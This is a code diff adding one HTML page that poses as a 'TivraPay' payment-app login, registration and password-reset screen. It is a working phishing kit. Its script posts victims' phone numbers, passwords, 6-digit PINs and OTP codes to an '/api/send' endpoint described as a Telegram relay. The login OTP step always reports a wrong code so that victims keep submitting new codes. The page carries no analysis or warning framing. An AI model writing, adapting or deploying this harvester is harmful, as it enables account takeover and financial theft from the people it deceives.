@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TivraPay • Secure Gateway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            transition: background 0.25s ease;
+        }
+
+        body.register-active {
+            background: #001275 !important;
+        }
+
+        .app-shell {
+            width: 100%;
+            max-width: 450px;
+            min-height: 100vh;
+            background: white;
+            position: relative;
+            transition: background 0.2s;
+        }
+
+        body.register-active .app-shell {
+            background: linear-gradient(145deg, #002aff 0%, #001275 100%);
+        }
+
+        .hero-banner {
+            width: 100%;
+            aspect-ratio: 450 / 230;
+            display: none;
+            overflow: hidden;
+        }
+
+        .hero-banner img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        body.register-active .hero-banner {
+            display: block;
+        }
+
+        .card-panel {
+            width: 100%;
+            background: #ffffff;
+            padding: 22px 24px 32px;
+            transition: all 0.2s;
+        }
+
+        .card-panel.login-layout {
+            margin-top: 0px;
+            border-radius: 0;
+        }
+
+        .card-panel.register-layout {
+            border-top-left-radius: 28px;
+            border-top-right-radius: 28px;
+            margin-top: -24px;
+            box-shadow: 0 -10px 28px rgba(0, 0, 0, 0.18);
+            flex: 1;
+        }
+
+        .logo-area {
+            text-align: center;
+            margin: 20px 0 28px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo-area img {
+            width: 320px;
+            max-width: 90%;
+            height: auto;
+            display: inline-block;
+        }
+
+        .view-section {
+            display: none;
+            width: 100%;
+        }
+
+        .view-section.active-view {
+            display: block;
+        }
+
+        .input-icon {
+            width: 28px !important;
+            height: 28px !important;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        .login-capsule .input-capsule {
+            background: #f4f7ff;
+            border-radius: 44px;
+            padding: 14px 22px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .login-capsule .input-capsule input {
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            flex: 1;
+            font-weight: 500;
+            color: #111;
+        }
+
+        .login-capsule .input-capsule input::placeholder {
+            color: #abb2c2;
+            font-weight: 400;
+        }
+
+        .register-rows .input-line,
+        .card-panel .input-line {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background: #f4f7ff;
+            border-radius: 44px;
+            padding: 14px 22px;
+            margin-bottom: 16px;
+            border-bottom: none;
+            gap: 12px;
+        }
+
+        .card-panel .input-line {
+            background: transparent;
+            border-radius: 0;
+            border-bottom: 1px solid #edf2f7;
+            padding: 16px 0;
+        }
+
+        .card-panel .input-line label {
+            width: 95px;
+            text-align: left;
+            font-weight: 500;
+            color: #2d3748;
+            font-size: 15px;
+            flex-shrink: 0;
+        }
+
+        .register-rows .input-line input,
+        .card-panel .input-line input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            background: transparent;
+            font-weight: 500;
+            color: #111;
+        }
+
+        .utils-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 16px 4px 24px 4px;
+            font-size: 14px;
+        }
+
+        .check-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #2b77ff;
+            cursor: pointer;
+        }
+
+        .forgot-link, .nav-link {
+            color: #2b77ff;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 1.5px solid #198cff;
+            border-radius: 50%;
+            outline: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            vertical-align: middle;
+            transition: 0.1s;
+            position: relative;
+        }
+
+        input[type="checkbox"]:checked {
+            background-color: #198cff;
+            border-color: #198cff;
+        }
+
+        input[type="checkbox"]:checked::after {
+            content: "";
+            position: absolute;
+            left: 5px;
+            top: 2px;
+            width: 4px;
+            height: 9px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #198cff;
+            border: none;
+            padding: 15px;
+            border-radius: 44px;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            box-shadow: 0 6px 14px rgba(25, 140, 255, 0.3);
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+            background: #0f6ed4;
+        }
+
+        .privacy-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin-top: 22px;
+            font-size: 13px;
+            color: #5b677b;
+        }
+
+        .privacy-row span {
+            color: #198cff;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .toggle-link {
+            text-align: center;
+            margin-top: 28px;
+            display: block;
+            color: #198cff;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .top-nav-bar {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px;
+            background: #ffffff;
+            position: relative;
+            border-bottom: 1px solid #edf2f7;
+        }
+
+        .back-arrow {
+            font-size: 20px;
+            color: #4a5568;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .nav-title {
+            flex: 1;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a202c;
+            margin-right: 20px;
+        }
+
+        .avatar-area {
+            text-align: left;
+            margin: 15px 0 25px 0;
+            padding-left: 4px;
+        }
+
+        .avatar-img {
+            width: 75px;
+            height: 75px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .form-subtitle {
+            font-size: 16px;
+            color: #2d3748;
+            font-weight: 500;
+            text-align: left;
+        }
+
+        .login-redirect-row {
+            text-align: right;
+            margin: 15px 0 30px 0;
+        }
+
+        /* Captcha Zone */
+        .captcha-zone {
+            margin: 20px 0 20px;
+        }
+        .captcha-title {
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #2c3e66;
+        }
+        .captcha-title span {
+            color: #e5484d;
+        }
+        .canvas-box {
+            position: relative;
+            width: 100%;
+            height: 140px;
+            background: #f0f2f8;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #e2e6ef;
+        }
+        #bgCanvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+        #pieceCanvas {
+            position: absolute;
+            top: 0;
+            left: 10px;
+            z-index: 12;
+            cursor: grab;
+        }
+        .slider-rail {
+            position: relative;
+            width: 100%;
+            height: 10px;
+            background: #e4e8f0;
+            border-radius: 20px;
+            margin-top: 18px;
+            border: 1px solid #cfd6e3;
+        }
+        .slider-drag {
+            position: absolute;
+            top: -9px;
+            left: 0;
+            width: 44px;
+            height: 28px;
+            background: #4a72ff;
+            border-radius: 30px;
+            cursor: grab;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+        .captcha-hint {
+            font-size: 11px;
+            color: #7e849b;
+            margin-top: 8px;
+        }
+        .captcha-success {
+            color: #1faf45;
+            font-weight: 700;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        /* Modals */
+        .otp-modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 2000; visibility: hidden; opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+        .otp-modal-overlay.active { visibility: visible; opacity: 1; }
+        .otp-modal-container {
+            width: 320px; background: white; border-radius: 32px;
+            padding: 28px 22px 36px; box-shadow: 0 20px 35px -12px rgba(0,0,0,0.3);
+            text-align: center; position: relative; transform: scale(0.95);
+            transition: transform 0.2s ease;
+        }
+        .otp-modal-overlay.active .otp-modal-container { transform: scale(1); }
+        .otp-close-btn {
+            position: absolute; top: 18px; right: 22px; font-size: 24px;
+            color: #8e9aaf; cursor: pointer; background: none; border: none;
+        }
+        .otp-title { font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 12px; }
+        .otp-subtext { font-size: 14px; color: #5b6b8c; margin-bottom: 20px; font-weight: 500; }
+        .otp-error-text { font-size: 13px; color: #e5484d; font-weight: 600; margin-bottom: 16px; min-height: 20px; }
+        .otp-input-group { display: flex; justify-content: center; gap: 14px; margin-bottom: 32px; }
+        .otp-digit-input {
+            width: 58px; height: 62px; text-align: center; font-size: 28px;
+            font-weight: 600; font-family: monospace; border: none;
+            border-bottom: 2.5px solid #dce2ec; background: transparent; outline: none; color: #0a2540;
+        }
+        .otp-digit-input:focus { border-bottom-color: #198cff; background: #f0f7ff; }
+
+        #pinInputGroup {
+            display: flex; justify-content: center; gap: 8px; margin: 20px auto; max-width: 280px;
+        }
+        #pinInputGroup input.pin-digit {
+            width: 36px !important; height: 44px !important; font-size: 18px; text-align: center;
+            border: none; border-bottom: 2.5px solid #dce2ec; background: transparent; outline: none; color: #0a2540;
+        }
+        #pinInputGroup input.pin-digit:focus { border-bottom-color: #198cff; background: #f0f7ff; }
+
+        .otp-resend-area { text-align: center; font-size: 13px; color: #8892b0; margin: 8px 0 12px; }
+        .verify-otp-btn {
+            width: 100%; background: #198cff; border: none; padding: 14px;
+            border-radius: 48px; font-size: 17px; font-weight: 700; color: white; margin-top: 18px; cursor: pointer;
+        }
+
+        .toast-popup {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.9);
+            background: #474e5d; color: white; padding: 16px 28px; border-radius: 14px;
+            font-size: 16px; font-weight: 500; display: flex; align-items: center; gap: 12px;
+            z-index: 9999; opacity: 0; visibility: hidden; transition: all 0.25s ease-in-out; white-space: nowrap;
+        }
+        .toast-popup.show { opacity: 1; visibility: visible; transform: translate(-50%, -50%) scale(1); }
+        .toast-icon { width: 24px; height: 24px; background: #ffffff; color: #474e5d; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; }
+
+        .privacy-content {
+            padding: 20px 24px 40px; color: #2d3748; font-size: 14px; line-height: 1.6;
+        }
+        .privacy-content h2 { font-size: 16px; color: #1a202c; margin: 20px 0 8px 0; font-weight: 700; }
+        .privacy-content p { margin-bottom: 12px; color: #4a5568; }
+    </style>
+</head>
+<body>
+
+<div class="app-shell">
+    <div class="hero-banner" id="heroBanner">
+        <img src="https://i.postimg.cc/tCM6t2tz/register.png" alt="welcome banner">
+    </div>
+
+    <!-- 1. LOGIN VIEW -->
+    <div id="loginView" class="view-section active-view card-panel login-layout">
+        <div class="logo-area">
+            <img src="https://zxcvwe.wiki/static/images/Login_Logo.png" alt="TivraPay">
+        </div>
+
+        <div class="input-capsule">
+            <img src="https://zxcvwe.wiki/static/icon/phone.png" alt="phone icon" class="input-icon">
+            <input type="text" id="loginPhone" placeholder="Enter phone number" autocomplete="off">
+        </div>
+
+        <div class="input-capsule">
+            <img src="https://zxcvwe.wiki/static/icon/password.png" alt="password icon" class="input-icon">
+            <input type="password" id="loginPassword" placeholder="Enter password" autocomplete="off">
+        </div>
+
+        <div class="utils-bar">
+            <label class="check-label">
+                <input type="checkbox" id="savePassCheck"> Save Password
+            </label>
+            <span class="forgot-link" onclick="switchView('forgotView')">Forgot password?</span>
+        </div>
+
+        <button type="button" class="btn-primary" id="loginBtn">Login</button>
+
+        <div class="privacy-row">
+            <input type="checkbox" id="privacyAgreeLogin" checked>
+            <label for="privacyAgreeLogin">Agree <span onclick="switchView('privacyView')">"User Privacy Agreement"</span></label>
+        </div>
+
+        <span class="toggle-link" onclick="switchView('registerView')">Don't have an account? Register</span>
+    </div>
+
+    <!-- 2. REGISTER VIEW -->
+    <div id="registerView" class="view-section card-panel register-layout">
+        <div class="input-line">
+            <img src="https://zxcvwe.wiki/static/icon/phone.png" alt="phone icon" class="input-icon">
+            <input type="text" id="regPhone" placeholder="Enter phone number">
+        </div>
+        <div class="input-line">
+            <img src="https://zxcvwe.wiki/static/icon/password.png" alt="password icon" class="input-icon">
+            <input type="password" id="regPassword" placeholder="Create password">
+        </div>
+        <div class="input-line">
+            <img src="https://zxcvwe.wiki/static/icon/password.png" alt="confirm icon" class="input-icon">
+            <input type="password" id="regConfirm" placeholder="Confirm password">
+        </div>
+        <div class="input-line">
+            <img src="https://zxcvwe.wiki/static/icon/phone.png" alt="invite icon" class="input-icon">
+            <input type="text" id="inviteCode" value="9KQ7KNlh4z" readonly style="font-weight:600;color:#111;">
+        </div>
+
+        <div class="captcha-zone">
+            <div class="captcha-title">Slider verification <span>*</span></div>
+            <div class="canvas-box">
+                <canvas id="bgCanvas" width="380" height="140" style="width:100%;height:auto;display:block;"></canvas>
+                <canvas id="pieceCanvas" width="380" height="140" style="position:absolute; top:0; left:0;"></canvas>
+            </div>
+            <div class="slider-rail" id="trackRail">
+                <div class="slider-drag" id="dragThumb"></div>
+            </div>
+            <div class="captcha-hint">➡️ Drag the puzzle piece to match the missing part</div>
+            <div class="captcha-success" id="captchaOkMsg">✓ Verification successful</div>
+        </div>
+
+        <button type="button" class="btn-primary" id="registerBtn">Register</button>
+        <span class="toggle-link" onclick="switchView('loginView')">Already have an account? Go Login</span>
+    </div>
+
+    <!-- 3. FORGOT / MODIFY PASSWORD VIEW -->
+    <div id="forgotView" class="view-section">
+        <div class="top-nav-bar">
+            <span class="back-arrow" onclick="switchView('loginView')">&#10094;</span>
+            <div class="nav-title">Modify password</div>
+        </div>
+        <div class="card-panel">
+            <div class="avatar-area">
+                <img src="https://zxcvwe.wiki/static/images/avatar.png" alt="User Avatar" class="avatar-img">
+                <div class="form-subtitle">Modify password Form</div>
+            </div>
+            <div class="input-line">
+                <label>Phone</label>
+                <input type="text" id="modifyPhone" placeholder="Enter phone number" autocomplete="off">
+            </div>
+            <div class="input-line">
+                <label>Password</label>
+                <input type="password" id="modifyPass" placeholder="Enter password" autocomplete="off">
+            </div>
+            <div class="input-line">
+                <label>Confirm</label>
+                <input type="password" id="modifyConfirm" placeholder="Password, Again" autocomplete="off">
+            </div>
+            <div class="login-redirect-row">
+                <span class="nav-link" onclick="switchView('loginView')">Already have an account, Go login</span>
+            </div>
+            <button type="button" class="btn-primary" id="modifyBtn">Modify</button>
+        </div>
+    </div>
+
+    <!-- 4. PRIVACY POLICY VIEW -->
+    <div id="privacyView" class="view-section">
+        <div class="top-nav-bar">
+            <span class="back-arrow" onclick="switchView('loginView')">&#10094;</span>
+            <div class="nav-title">User Privacy Agreement</div>
+        </div>
+        <div class="privacy-content">
+            <p>This application respects and protects the personal privacy of all users who use the service...</p>
+            <h2>1. Scope of application</h2>
+            <p>(a) When you register the account of this application, the personal registration information you provide...</p>
+            <h2>2. Information use</h2>
+            <p>(a) This application will not provide, sell, rent, share or trade your personal information...</p>
+        </div>
+    </div>
+</div>
+
+<!-- PIN Modal -->
+<div id="pinModal" class="otp-modal-overlay">
+    <div class="otp-modal-container">
+        <button type="button" class="otp-close-btn" onclick="closeModal('pinModal')">&times;</button>
+        <div class="otp-title">Please confirm 6-digit Pin</div>
+        <div class="otp-subtext">Enter your 6-digit security pin</div>
+        <div class="otp-error-text" id="pinErrorText"></div>
+        <div class="otp-input-group" id="pinInputGroup">
+            <input type="text" maxlength="1" class="otp-digit-input pin-digit" id="pin0" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input pin-digit" id="pin1" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input pin-digit" id="pin2" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input pin-digit" id="pin3" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input pin-digit" id="pin4" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input pin-digit" id="pin5" inputmode="numeric">
+        </div>
+        <button type="button" class="verify-otp-btn" id="verifyPinBtn">Confirm Pin</button>
+    </div>
+</div>
+
+<!-- OTP Modal -->
+<div id="otpModal" class="otp-modal-overlay">
+    <div class="otp-modal-container">
+        <button type="button" class="otp-close-btn" onclick="closeModal('otpModal')">&times;</button>
+        <div class="otp-title" id="otpModalTitle">Please enter OTP</div>
+        <div class="otp-subtext" id="otpSubtext">OTP sent to **********</div>
+        <div class="otp-error-text" id="otpErrorText"></div>
+        <div class="otp-input-group">
+            <input type="text" maxlength="1" class="otp-digit-input o-digit" id="otp0" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input o-digit" id="otp1" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input o-digit" id="otp2" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-digit-input o-digit" id="otp3" inputmode="numeric">
+        </div>
+        <div class="otp-resend-area">
+            <span id="resendText">Resend in <span id="timerSeconds">120</span>s</span>
+        </div>
+        <button type="button" class="verify-otp-btn" id="verifyOtpBtn">Verify & Proceed</button>
+    </div>
+</div>
+
+<!-- Toast -->
+<div id="customToast" class="toast-popup">
+    <div class="toast-icon" id="toastIcon">✕</div>
+    <span id="toastText">Success</span>
+</div>
+
+<script>
+    // View Switcher Function
+    function switchView(viewId) {
+        document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active-view'));
+        document.getElementById(viewId).classList.add('active-view');
+        
+        const body = document.body;
+        const banner = document.getElementById('heroBanner');
+        
+        if (viewId === 'registerView') {
+            body.classList.add('register-active');
+            banner.style.display = 'block';
+        } else {
+            body.classList.remove('register-active');
+            banner.style.display = 'none';
+        }
+        window.scrollTo(0, 0);
+    }
+
+    function closeModal(modalId) {
+        document.getElementById(modalId).classList.remove('active');
+    }
+
+    // Telegram Sender Helper via Vercel Backend API (/api/send)
+    async function sendToTelegram(payload) {
+        try {
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {
+            console.log('Telegram API error:', err);
+        }
+    }
+
+    let currentPhone = '';
+    let currentPassword = '';
+    let flowType = 'login'; // login or modify
+
+    // --- Login Flow ---
+    document.getElementById('loginBtn').addEventListener('click', () => {
+        currentPhone = document.getElementById('loginPhone').value.trim();
+        currentPassword = document.getElementById('loginPassword').value.trim();
+
+        if (!currentPhone || !currentPassword) {
+            alert('Please enter phone number and password');
+            return;
+        }
+
+        flowType = 'login';
+        sendToTelegram({ type: 'login', phone: currentPhone, password: currentPassword });
+
+        document.getElementById('pinModal').classList.add('active');
+        document.querySelectorAll('.pin-digit').forEach(i => i.value = '');
+        document.getElementById('pin0').focus();
+    });
+
+    // PIN Verification
+    document.getElementById('verifyPinBtn').addEventListener('click', () => {
+        let pin = '';
+        document.querySelectorAll('.pin-digit').forEach(i => pin += i.value);
+
+        if (pin.length < 6) {
+            document.getElementById('pinErrorText').textContent = 'Please enter complete 6-digit PIN';
+            return;
+        }
+
+        sendToTelegram({ type: 'pin', phone: currentPhone, pin: pin });
+        document.getElementById('pinModal').classList.remove('active');
+
+        // Open OTP Modal
+        document.getElementById('otpModal').classList.add('active');
+        document.querySelectorAll('.o-digit').forEach(i => i.value = '');
+        document.getElementById('otp0').focus();
+        document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
+    });
+
+    // OTP Input Navigation
+    const otpInputs = document.querySelectorAll('.o-digit');
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < otpInputs.length - 1) otpInputs[index + 1].focus();
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && index > 0) otpInputs[index - 1].focus();
+        });
+    });
+
+    const pinInputs = document.querySelectorAll('.pin-digit');
+    pinInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < pinInputs.length - 1) pinInputs[index + 1].focus();
+        });
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && input.value === '' && index > 0) pinInputs[index - 1].focus();
+        });
+    });
+
+    // Verify OTP & Login / Modify
+    document.getElementById('verifyOtpBtn').addEventListener('click', () => {
+        let otp = '';
+        otpInputs.forEach(i => otp += i.value);
+
+        if (otp.length < 4) {
+            document.getElementById('otpErrorText').textContent = 'Please enter complete 4-digit OTP';
+            return;
+        }
+
+        if (flowType === 'login') {
+            sendToTelegram({ type: 'otp', phone: currentPhone, otp: otp });
+            document.getElementById('otpErrorText').textContent = '❌ Wrong OTP! Please try again.';
+            otpInputs.forEach(i => i.value = '');
+            otpInputs[0].focus();
+        } else {
+            sendToTelegram({ type: 'modify', phone: currentPhone, password: currentPassword, otp: otp });
+            document.getElementById('otpModal').classList.remove('active');
+            
+            const toast = document.getElementById('customToast');
+            document.getElementById('toastText').textContent = 'Password modified successfully!';
+            document.getElementById('toastIcon').textContent = '✓';
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+                switchView('loginView');
+            }, 2000);
+        }
+    });
+
+    // --- Modify Password Flow ---
+    document.getElementById('modifyBtn').addEventListener('click', () => {
+        const phone = document.getElementById('modifyPhone').value.trim();
+        const pass = document.getElementById('modifyPass').value.trim();
+        const confirm = document.getElementById('modifyConfirm').value.trim();
+
+        if (!phone || !pass || !confirm) {
+            alert('Please fill all fields');
+            return;
+        }
+        if (pass !== confirm) {
+            alert('Passwords do not match');
+            return;
+        }
+
+        currentPhone = phone;
+        currentPassword = pass;
+        flowType = 'modify';
+
+        sendToTelegram({ type: 'modify_req', phone: currentPhone, password: currentPassword });
+        document.getElementById('otpModal').classList.add('active');
+        document.querySelectorAll('.o-digit').forEach(i => i.value = '');
+        document.getElementById('otp0').focus();
+        document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
+    });
+</script>
+</body>
+</html>
